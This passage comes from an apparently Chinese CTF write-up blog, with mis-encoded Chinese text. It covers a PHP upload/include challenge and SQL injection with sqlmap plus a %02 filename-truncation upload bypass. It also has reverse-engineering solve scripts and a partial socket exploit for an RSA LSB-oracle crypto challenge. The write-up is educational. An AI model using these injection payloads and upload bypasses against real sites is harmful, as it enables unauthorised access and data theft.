&#125;</span><br><span class="line">        $ext = end($filename);</span><br><span class="line">        <span class="keyword">if</span>($ext==$filename[count($filename) - <span class="number">1</span>])&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;emmmm...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $new_name = (<span class="keyword">string</span>)rand(<span class="number">100</span>,<span class="number">999</span>).<span class="string">&quot;.&quot;</span>.$ext;</span><br><span class="line">        move_uploaded_file($_FILES[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],$new_name);</span><br><span class="line">        $_ = $_POST[<span class="string">&#x27;hehe&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>(@substr(file($_)[<span class="number">0</span>],<span class="number">0</span>,<span class="number">6</span>)===<span class="string">&#x27;@&lt;?php&#x27;</span> &amp;&amp; strpos($_,$new_name)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">include</span>($_);</span><br><span class="line">        &#125;</span><br><span class="line">        unlink($new_name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼Œçœ‹åˆ°æœ€é‡Œé¢çš„ include è¿˜ä»¥ä¸ºæ˜¯ä»Šå¹´ HITCON çš„ one-line-challenge å‡çº§ç‰ˆï¼Œç»“æœå¡åœ¨äº†ç¬¬ä¸€æ­¥â€¦</p><p>ç¬¬ä¸€æ­¥æ˜¯ç½‘é¼æ¯çš„ä¸Šä¼ é¢˜ï¼Œå­¦ä¹ äº†ä¸€æ³¢ç”¨æ•°ç»„ç»•è¿‡ã€‚</p><p>ä¹‹åæ–‡ä»¶ååŒ…å«éšæœºæ•°ï¼Œç›´æ¥çˆ†ç ´ã€‚æœ‰ä¸ª unlike ä½¿ç”¨ <code>/.</code> ç»•è¿‡ã€‚</p><p>ä¸»åŠæ–¹ç›´æ¥æŠŠå¹³å°å…³äº†â€¦ å¤ªç‹ äº†ï¼Œè¿˜æƒ³ç€å¤ç°ä¸€æ³¢ï¼Œåªèƒ½çœ‹çœ‹å„ä½å¤§å¸ˆå‚…çš„ wp äº†ã€‚</p><h4 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h4><p>é¦–å…ˆæ˜¯ sql æ³¨å…¥ï¼Œé¦–å…ˆç»å…¸<code>&#39; or 1# å’Œ</code> <code>&#39;or 0#</code> ï¼Œç„¶åæ‹¿ sqlmap è·‘ä¸€æ³¢ ï¼Œlevel5 æ²¡æœ‰ä»€ä¹ˆåµç”¨ã€‚</p><p>æŠŠç›²æ³¨çš„ payload è´´åˆ° sqlmap çš„ url é‡Œï¼Œsqlmap ä¸€æŠŠæ¢­ï¼Œç›´æ¥æ³¨å‡ºæ¥ç®¡ç†å‘˜å¯†ç ï¼š</p><p><img src="https://upload-images.jianshu.io/upload_images/9223743-f7d77303ea1135aa.png" alt="QQå›¾ç‰‡20181105115110.png"></p><p> è§£å¯†ï¼Œå¯†ç æ˜¯<code>adminpassword</code>ï¼Œè¿›å»å‘ç°æ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ ï¼Œä¸€ç›´æ˜¾ç¤º<code>uploaded to ./***.txt please upload to ./flag.php</code>  è®¿é—®æ–‡ä»¶å‘ç°ä¹Ÿæ²¡æœ‰ï¼Œä¸€ç›´æƒ³ getshell å¡åœ¨è¿™é‡Œã€‚</p><p>èµ›åçœ‹å¸ˆå‚…é¢˜è§£å‘ç°è‡ªå·±æ€è·¯å¤ªåƒµç¡¬äº†â€¦ è¿™ä¸ªé¢˜åªéœ€è¦ä¸Šä¼ åˆ° flag.php å°±å¾—åˆ° flagï¼Œæ€è·¯å°±æ˜¯æŠ“åŒ…å‘ç°æ–‡ä»¶åæ‹¼æ¥ï¼Œç»•è¿‡è¿‡æ»¤çš„ <strong>php</strong>ï¼Œç„¶åæœ‰ä¸ª<code>%02</code> çš„æˆªæ–­ï¼ˆä»æ¥æ²¡å¬è¯´è¿‡â€¦.ï¼‰ï¼Œè‡ªå·±å¤ªèœäº†ã€‚</p><h3 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h3><h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><p>ä¸¤ä¸ªå…³é”®å‡½æ•°ç¬¬ä¸€ä¸ª sub_40111Aç®€å•çš„å¼‚æˆ–ä¸ç§»ä½ï¼Œæ‰€ä»¥é€†ç®—æ³•å°±æ˜¯å°†æ•°ç»„å…ˆæŒ‰ä½å¼‚æˆ–ï¼Œç„¶åæ•°ç»„å·¦ç§»å…­ä½|æ•°ç»„å³ç§»ä¸¤ä½ã€‚ç¬¬äºŒä¸ªSub_401332å¤ä¹ äº†ä¸‹ç¦»æ•£æ•°å­¦ï¼Œç»è¿‡å„ç§é€»è¾‘è¿ç®—åå…¶å®æœ€åè¿˜æ˜¯ç­‰æ•ˆä¸ºå¼‚æˆ–ï¼Œç›¸é‚»æ•°å¼‚æˆ–ç„¶åä¸€å…±å››è½®ã€‚</p><p>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag1=<span class="string">&#x27;&#x27;</span></span><br><span class="line">num1=[<span class="number">0x99</span>, <span class="number">0xB0</span>, <span class="number">0x87</span>, <span class="number">0x9E</span>, <span class="number">0x70</span>, <span class="number">0xE8</span>,</span><br><span class="line">      <span class="number">0x41</span>, <span class="number">0x44</span>, <span class="number">0x05</span>, <span class="number">0x04</span>, <span class="number">0x8B</span>, <span class="number">0x9A</span>,</span><br><span class="line">      <span class="number">0x74</span>, <span class="number">0xBC</span>, <span class="number">0x55</span>, <span class="number">0x58</span>, <span class="number">0xB5</span>, <span class="number">0x61</span>,</span><br><span class="line">      <span class="number">0x8E</span>, <span class="number">0x36</span>, <span class="number">0xAC</span>, <span class="number">0x09</span>, <span class="number">0x59</span>, <span class="number">0xE5</span>,</span><br><span class="line">      <span class="number">0x61</span>, <span class="number">0xDD</span>, <span class="number">0x3E</span>, <span class="number">0x3F</span>, <span class="number">0xB9</span>, <span class="number">0x15</span>,</span><br><span class="line">      <span class="number">0xED</span>, <span class="number">0xD5</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num1)<span class="number">-1</span>,<span class="number">0</span>,<span class="number">-1</span>):</span><br><span class="line">        num1[j]=num1[j<span class="number">-1</span>]^num1[j]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(num1)):</span><br><span class="line">    flag1+=<span class="built_in">chr</span>((num1[i]^i)&gt;&gt;<span class="number">2</span>|(((num1[i]^i)&lt;&lt;<span class="number">6</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line"><span class="built_in">print</span> flag1</span><br><span class="line"><span class="comment">#flag&#123;W0w_y0u_m4st3r_C_p1us_p1us&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="What-is-it"><a href="#What-is-it" class="headerlink" title="What is it"></a>What is it</h4><p>å…ˆçˆ†ç ´ md5ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crackMd5</span>():</span></span><br><span class="line">product = itertools.permutations(string.letters[:<span class="number">26</span>],<span class="number">6</span>)</span><br><span class="line"><span class="keyword">for</span> test <span class="keyword">in</span> product:</span><br><span class="line">md5_test = md5(<span class="string">&quot;&quot;</span>.join(test)).hexdigest()</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(test)</span><br><span class="line">var1 = <span class="number">0</span></span><br><span class="line">var2 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(md5_test)):</span><br><span class="line"><span class="keyword">if</span> md5_test[i]==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">var1 += <span class="number">1</span></span><br><span class="line">var2 += i</span><br><span class="line"><span class="keyword">if</span> <span class="number">10</span>*var1 + var2 == <span class="number">0x193</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;ans : &quot;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;&quot;</span>.join(test)</span><br><span class="line"><span class="built_in">print</span> md5_test</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;failed!&quot;</span></span><br><span class="line"></span><br><span class="line">crackMd5()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ozulmt è¿™æ˜¯è·‘å‡ºçš„å­—ç¬¦ä¸²ï¼Œç„¶ååŠ¨æ€è°ƒè¯•å¯ä»¥åœ¨å†…å­˜ä¸­ç›´æ¥çœ‹åˆ° flag,ä¸è¿‡è¦åŠ ä¸Šæ ¼å¼ï¼Œæ ¹æ®checkhtåŠ ä¸Šå°±å¥½.</p><blockquote><p>flag{a197b847-7092-53a4-7c41-bc7d6d52e69d} </p></blockquote><h4 id="Cyvm"><a href="#Cyvm" class="headerlink" title="Cyvm"></a>Cyvm</h4><p>è™šæ‹Ÿæœºé€†å‘ï¼Œç›´æ¥ Angr è·‘ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = angr.Project(<span class="string">&#x27;cyvm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_chars = [claripy.BVS(<span class="string">&#x27;flag_%d&#x27;</span> % i, <span class="number">8</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]</span><br><span class="line">flag = claripy.Concat(*flag_chars + [claripy.BVV(<span class="string">b&#x27;\n&#x27;</span>)])</span><br><span class="line">st = p.factory.blank_state(addr=<span class="number">0x400CB1</span>,stdin=flag)</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> flag_chars:</span><br><span class="line">    st.solver.add(k &gt;= <span class="number">32</span>)</span><br><span class="line">    st.solver.add(k &lt;= <span class="number">126</span>)</span><br><span class="line"></span><br><span class="line">st.solver.add(flag_chars[<span class="number">0</span>] == <span class="string">&#x27;f&#x27;</span>)</span><br><span class="line">st.solver.add(flag_chars[<span class="number">1</span>] == <span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">st.solver.add(flag_chars[<span class="number">2</span>] == <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">st.solver.add(flag_chars[<span class="number">3</span>] == <span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">st.solver.add(flag_chars[<span class="number">4</span>] == <span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sm = p.factory.simulation_manager(st)</span><br><span class="line">sm.explore(find=<span class="number">0x400CD2</span>)</span><br><span class="line"></span><br><span class="line">found = sm.found[<span class="number">0</span>]</span><br><span class="line">solution = found.solver.<span class="built_in">eval</span>(flag, cast_to=<span class="built_in">str</span>)</span><br><span class="line"><span class="built_in">print</span> solution</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{7h15_15_MY_f1rs7_s1mpl3_Vm} </p></blockquote><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>Web æ„Ÿè§‰æœ‰äº›è„‘æ´çš„ä¸œè¥¿ï¼ŒCrypto çš„é¢˜éƒ½è¦å†™è„šæœ¬ï¼Œsocket æ„Ÿè§‰æœ‰ç‚¹éš¾ç”¨ï¼Œè¦è½¬ pwntools äº†â€¦.</p><p>åšå‡º Misc çš„éƒ½æ˜¯å¸¦å“¥ã€‚ </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018 HITCON Crypto lost key</title>
      <link href="/2018/10/24/2018-HITCON-Crypto/"/>
      <url>/2018/10/24/2018-HITCON-Crypto/</url>
      
        <content type="html"><![CDATA[<h3 id="lost-key"><a href="#lost-key" class="headerlink" title="lost key"></a>lost key</h3><p>èµ›åå­¦ä¹ äº†ä¸€ä¸‹è¿™é“å¯†ç é¢˜çš„æ”»å‡»å§¿åŠ¿ã€‚</p><p>é¢˜ç›®è„šæœ¬å¦‚ä¸‹ï¼š</p><a id="more"></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys,os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys.stdin  = os.fdopen(sys.stdin.fileno(), <span class="string">&#x27;r&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">sys.stdout = os.fdopen(sys.stdout.fileno(), <span class="string">&#x27;w&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">rnd = SystemRandom()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcA</span>(<span class="params">g,n,data</span>):</span></span><br><span class="line">  num = bytes_to_long(data)</span><br><span class="line">  res = <span class="built_in">pow</span>(g,num,n*n)</span><br><span class="line">  r = rnd.randint(<span class="number">0</span>,n<span class="number">-1</span>)</span><br><span class="line">  magic = <span class="built_in">pow</span>(r,n,n*n)</span><br><span class="line">  res = (res*magic)%(n*n)</span><br><span class="line">  <span class="keyword">return</span> long_to_bytes(res).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calcB</span>(<span class="params">phi,n,u,data</span>):</span></span><br><span class="line">  num = bytes_to_long(data)</span><br><span class="line">  res = <span class="built_in">pow</span>(num,phi,n*n)</span><br><span class="line">  res = (res - <span class="number">1</span>)/n</span><br><span class="line">  res = (res*u)%n</span><br><span class="line">  <span class="keyword">return</span> long_to_bytes(res).encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  p = getPrime(<span class="number">512</span>)</span><br><span class="line">  q = getPrime(<span class="number">512</span>)</span><br><span class="line">  n = p*q</span><br><span class="line">  phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">  g = n+<span class="number">1</span></span><br><span class="line">  u = invert(phi,n)</span><br><span class="line">  flag = <span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>).read()</span><br><span class="line">  <span class="built_in">print</span> <span class="string">&#x27;Here is the flag!&#x27;</span></span><br><span class="line">  <span class="built_in">print</span> calcA(g,n,flag)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">2048</span>):</span><br><span class="line">    m = raw_input(<span class="string">&#x27;cmd: &#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> m[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span>:</span><br><span class="line">      m = raw_input(<span class="string">&#x27;input: &#x27;</span>)</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        m = m.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> calcA(g,n,m)</span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;no&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">if</span> m[<span class="number">0</span>] == <span class="string">&#x27;B&#x27;</span>:</span><br><span class="line">      m = raw_input(<span class="string">&#x27;input: &#x27;</span>)</span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">        m = m.decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span> calcB(phi,n,u,m)[<span class="number">-2</span>:]</span><br><span class="line">      <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;no&#x27;</span></span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœåŠ¡å™¨éšæœºç”Ÿæˆ RSA ä¸­çš„ n å’Œ eï¼Œå¹¶å°† flag çš„å¯†æ–‡å‘ç»™æˆ‘ä»¬ã€‚æœåŠ¡å™¨æä¾›äº†ä¸¤ä¸ªæœåŠ¡ï¼šå¯¹äºæˆ‘ä»¬ç»™å‡ºçš„æ˜æ–‡æœåŠ¡å™¨è¿”å›å¯†æ–‡ï¼›å¯¹äºæˆ‘ä»¬ç»™å‡ºçš„å¯†æ–‡è¿”å›è§£å¯†åçš„æ˜æ–‡æœ€åä¸€ä¸ªå­—èŠ‚ã€‚</p><p>è¿™ä¸ªé¢˜è€ƒç‚¹æœ‰ä¸¤ä¸ªï¼šè·å–å…¬é’¥å’Œ LSB Oracle Attrackã€‚</p><h4 id="è·å–å…¬é’¥"><a href="#è·å–å…¬é’¥" class="headerlink" title="è·å–å…¬é’¥"></a>è·å–å…¬é’¥</h4><p>é¦–å…ˆæˆ‘ä»¬éœ€è¦è·å¾—å…¬é’¥ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡é€‰æ‹©æ˜æ–‡æ”»å‡»çš„å…¸å‹æ‰‹æ³•è·å– nï¼ŒåŸç†å¤§è‡´å¦‚ä¸‹ï¼š</p><p>æˆ‘ä»¬é¦–å…ˆå‘é€ 2 è®©æœåŠ¡å™¨è¿›è¡ŒåŠ å¯†ï¼Œè¿”å› <strong>c1=2<sup>e</sup> mod n</strong><br>ç»§ç»­å‘é€ 2**2ï¼Œä¹Ÿå°±æ˜¯ 4ï¼Œè®©æœåŠ¡å™¨è¿›è¡ŒåŠ å¯†ï¼Œè¿”å› <strong>c2=4<sup>e</sup> mod n</strong><br>æˆ‘ä»¬æœ‰ï¼š<strong>c1<sup>2</sup>-c2=kn</strong></p><p>ä¸ºä»€ä¹ˆå‘¢ï¼Ÿä¸å¦¨è®¾ 2<sup>e</sup>=a+bn,æˆ‘ä»¬æœ‰ <strong>c1=(a+bn)mod n=a</strong>,åŒæ—¶ <strong>c2=(a<sup>2</sup>+2abn+b<sup>2</sup>n<sup>2</sup>)mod n =a<sup>2</sup> mod n</strong>,æ‰€ä»¥ c1<sup>2</sup> å’Œ c2 æ¨¡ n åŒä½™ã€‚</p><p>ä¸€èˆ¬æ¥è¯´ a<sup>2</sup> ä¼šæ¯” n å¤§ï¼Œæ‰€ä»¥ k ä¸ä¸º 0ã€‚</p><p>åŒç†æˆ‘ä»¬åˆ†åˆ«å‘é€ 3 å’Œ 9ï¼Œç”¨åŒæ ·çš„æ–¹æ³•å¾—åˆ°äº† n çš„åˆä¸€ä¸ªå€æ•°,è®¡ç®—ä»–ä»¬çš„å…¬å› æ•°ï¼Œè¿™æ ·å¤§æ¦‚ç‡å¾—åˆ°çš„å°±æ˜¯ nã€‚</p><p>ä¸ºäº†å‡†ç¡®æˆ‘ä»¬ä¹Ÿå¯ä»¥å¤šå‘é€å‡ ç»„ï¼Œå–ä»–ä»¬çš„å…¬å› æ•°ã€‚</p><h4 id="è·å–-flag"><a href="#è·å–-flag" class="headerlink" title="è·å– flag"></a>è·å– flag</h4><p>å¾—åˆ°äº† n,æˆ‘ä»¬å°±å¯ä»¥è·å– flag äº†ã€‚è¿™ä¸ªé¢˜æä¾›çš„è§£å¯†è¿”å›è§£å¯†ç»“æœçš„æœ€åä¸€ä¸ªå­—èŠ‚ï¼Œå¾ˆåƒä¹‹å‰ Xman é€‰æ‹”èµ›å‡ºå›½çš„ç»å…¸çš„ LSB Oracle Attrackï¼ˆä¸äº†è§£çš„å¯ä»¥çœ‹ä¸€ä¸‹<a href="https://xz.aliyun.com/t/2446#toc-27"> è¿™ç¯‡ </a>ä»¥åŠ<a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_3"> ctf-wiki çš„ç›¸å…³æ¨å¯¼ </a>ï¼‰</p><p>ä¹‹å‰çš„æ˜¯ç»™æˆ‘ä»¬æœ€åä¸€ä¸ª bit çš„å€¼ï¼Œä¹Ÿå°±æ˜¯å¯¹åº”æ˜æ–‡çš„å¥‡å¶ï¼Œç°åœ¨ç»™æˆ‘ä»¬çš„ä¸ä»…ä»…æ˜¯ 1 bit è€Œæ˜¯ 8 bitã€‚</p><p>å¦‚æœæˆ‘ä»¬è€ƒè™‘ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œå³æµªè´¹ä»–ç»™çš„é‚£ 7 ä¸ª bitï¼Œæˆ‘ä»¬ä¼šå‘ç°ç”±äº n æ˜¯ 1024 ä½ï¼Œé‡‡ç”¨äºŒåˆ†é€¼è¿‘éœ€è¦ 1024 æ¬¡ï¼Œé¢˜ç›®è¿æ¥ä¸€æ¬¡åªæä¾› 150 æ¬¡äº¤äº’ï¼Œæ˜¾ç„¶æ¡ä»¶ä¸èƒ½æµªè´¹ã€‚</p><p>ç»™äº†æˆ‘ä»¬æœ€åä¸€å­—èŠ‚ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é‡‡ç”¨åˆ©ç”¨æœ€å 1bit æ”»å‡»ç±»ä¼¼çš„æ‰‹æ³•ï¼Œè¯¦ç»†çš„æ¨å¯¼è¿‡ç¨‹ iromise å¸ˆå‚…å·²ç»åœ¨ <a href="https://ctf-wiki.github.io/ctf-wiki/crypto/asymmetric/rsa/rsa_chosen_plain_cipher/#_5">ctf-wiki ç›¸å…³éƒ¨åˆ†</a>ä¸­å†™çš„å¾ˆè¯¦ç»†äº†ã€‚</p><p>ä¸‹é¢æ˜¯ exp:(æˆ‘ç”¨çš„æ˜¯ socketï¼Œpwn å¸ˆå‚…ä»¬å¯èƒ½ä¹ æƒ¯ç”¨ pwntoolsï¼Œå¯ä»¥å‚è€ƒ wiki é‡Œçš„è„šæœ¬)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span>  bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> Fraction</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">s = socket.socket()</span><br><span class="line">s.connect((<span class="string">&quot;18.179.251.168&quot;</span>, <span class="number">21700</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">data</span>):</span>  <span class="comment">#åŠ å¯†</span></span><br><span class="line">    s.send(<span class="string">&quot;A&quot;</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.send(long_to_bytes(data).encode(<span class="string">&quot;hex&quot;</span>)+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    result=s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> bytes_to_long(result.decode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">data</span>):</span>  <span class="comment">#è§£å¯†</span></span><br><span class="line">    s.send(<span class="string">&quot;B&quot;</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.send(long_to_bytes(data).encode(<span class="string">&quot;hex&quot;</span>) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    result = s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    s.recv(<span class="number">1024</span>).strip()</span><br><span class="line">    <span class="keyword">return</span> bytes_to_long(result.decode(<span class="string">&quot;hex&quot;</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recover_pubkey</span>():</span> <span class="comment">#è·å–å…¬é’¥ n</span></span><br><span class="line">    two = enc(<span class="number">2</span>)</span><br><span class="line">    three = enc(<span class="number">3</span>)</span><br><span class="line">    power_two = enc(<span class="number">2</span>**<span class="number">2</span>)</span><br><span class="line">    power_three = enc(<span class="number">3</span>**<span class="number">2</span>)</span><br><span class="line">    n = gmpy2.gcd(two ** <span class="number">2</span> - power_two, three ** <span class="number">2</span> - power_three)</span><br><span class="line">    <span class="keyword">while</span> n % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        n = n / <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> n 